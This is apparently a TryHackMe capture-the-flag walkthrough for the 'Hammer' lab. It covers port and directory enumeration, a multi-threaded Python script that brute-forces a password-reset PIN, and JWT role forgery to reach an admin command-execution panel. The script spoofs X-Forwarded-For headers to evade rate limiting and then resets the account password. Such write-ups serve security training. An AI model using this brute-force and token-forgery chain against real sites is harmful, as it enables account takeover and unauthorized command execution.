## Hammer
https://tryhackme.com/room/hammer

```
nmap -sC -sV -p- -O ip_target
```

Found 2 open ports:  
`22`  
`1337`

Navigated to:  
`http://ip_target:1337`

A login page appears.

Tried resetting the password, but an email was required.  
That means we need further enumeration.

```
ffuf -u 'http://target_ip:1337/hmr_FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -mc all -ic -fw 23
```

`-u:` (URL) — URL with the keyword FUZZ, which will be replaced with words from the dictionary.  
`-w:` (wordlist) — path to the dictionary file from which values will be taken for substitution instead of FUZZ.  
`-t:` (threads) — number of threads (simultaneous requests), speeds up scanning.  
`-mc:` (match code) — filtering by response code.  
`-ic:` (ignore case) — ignore case when comparing strings in the results.  
`-fw:` (filter words) — filter by the number of words in the answer.

Discovered an interesting directory `/logs`.  
Visited:  
`http://target_ip:1337/logs`

![1](https://github.com/user-attachments/assets/15b82944-a77a-4bb0-a59b-80513614b72a)


After password reset, a **PIN code** is required.

Used a **Python brute-force script** found online to automate the attack:

```
import requests
import random
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://target_ip:1337/reset_password.php"
num_threads = 50
stop_flag = threading.Event()

# Retry mechanism
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504],
    raise_on_status=False
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)

def brute_force_code(start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                },
                timeout=10,
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            elif "Invalid or expired recovery code!" not in r.text:
                stop_flag.set()
                print(f"[+] Found the recovery code: {code_str}")
                print("[+] Sending the new password request.")
                new_password = "Password123"
                session.post(
                    url,
                    data={
                        "new_password": new_password,
                        "confirm_password": new_password,
                    },
                    headers={
                        "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    },
                )
                print(f"[+] Password is set to {new_password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

def main():
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

**Initialize a session with retries (Retry):**

1.  Use requests.Session() with Retry to automatically retry requests on 5xx (server) errors.
2.  Simulate sending a password reset request:  
    Send a POST request from email (tester@hammer.thm) to start the recovery process.
3.  Multi-threaded brute force:  
    The range 0000–9999 is divided between num_threads (50 threads).  
    Each thread sends a recovery code (recovery_code=XXXX) to /reset_password.php.
4.  IP randomization via X-Forwarded-For header:  
    Simulate different IP addresses to bypass possible restrictions (e.g. rate-limit).
5.  Response check:  
    If the code is invalid → the response contains "Invalid or expired recovery code!" — continue.  
    If the answer is different → the code is probably correct:  
    A new password is set (Password123) with this code.  
    Threads are stopped via stop_flag.
6.  Error and timeout handling:  
    Request errors do not break the thread (try/except is used).  
    If the status is 302 (redirect) — it is considered a timeout, the script is interrupted.  
    **Important details:**
7.  Threading is used to speed up brute force.
8.  Protection against blocking is implemented via a fake X-Forwarded-For.
9.  Automation of the entire chain: from a reset request to setting a new password.

*After running the script, I obtained the correct PIN, entered it, and reached a flag page and a command execution panel.*

Intercepted the request using `Burp Suite`

Attempted to send. But the server responded with:
"Command not allowed".

```
POST /execute_command.php HTTP/1.1
Host: 10.10.38.118:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ5MTk4ODY5LCJleHAiOjE3NDkyMDI0NjksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.x9KOvF9KeyEIWOt3Gs9PZhaotmMc_jaiGLhA0vqnBBU
X-Requested-With: XMLHttpRequest
Content-Length: 16
Origin: http://10.10.38.118:1337
Connection: keep-alive
Referer: http://10.10.38.118:1337/dashboard.php
Cookie: PHPSESSID=fmhk717ddl86qkvbipliohmvnr; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ5MTk4ODY5LCJleHAiOjE3NDkyMDI0NjksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.x9KOvF9KeyEIWOt3Gs9PZhaotmMc_jaiGLhA0vqnBBU; persistentSession=no
Priority: u=0

{"command":"id"}
```

Tried instead `ls`:

Got back:

`188ade1.key`

Accessed the file at:  
`target_ip:1337/188ade1.key`  

Downloaded key:
`56058354efb3daa97ebab00fabd7a7d7`



Intercepted a JWT token from request headers:

<img width="478" alt="2" src="https://github.com/user-attachments/assets/2671a677-e4cf-4d7b-88bd-83667070921c" />


Used jwt.io to decode and modify the payload with [JWT](https://jwt.io)

<img width="577" alt="3" src="https://github.com/user-attachments/assets/4a7e8691-59da-4b58-8369-65d98d64e7c7" />


<img width="538" alt="4" src="https://github.com/user-attachments/assets/bbe55edd-2c4d-4e74-b738-de694eb7b5c4" />




Changed  `user` to `admin`:

<img width="421" alt="6" src="https://github.com/user-attachments/assets/ced8e638-c1d9-4886-9182-9a997cb6e3ab" />


Replaced the token in Burp with the new one:

![5](https://github.com/user-attachments/assets/3d31c778-1a85-4943-89e4-e49bbb9b6c5e)


With admin privileges, the command execution now works properly.
## Well Done !!!
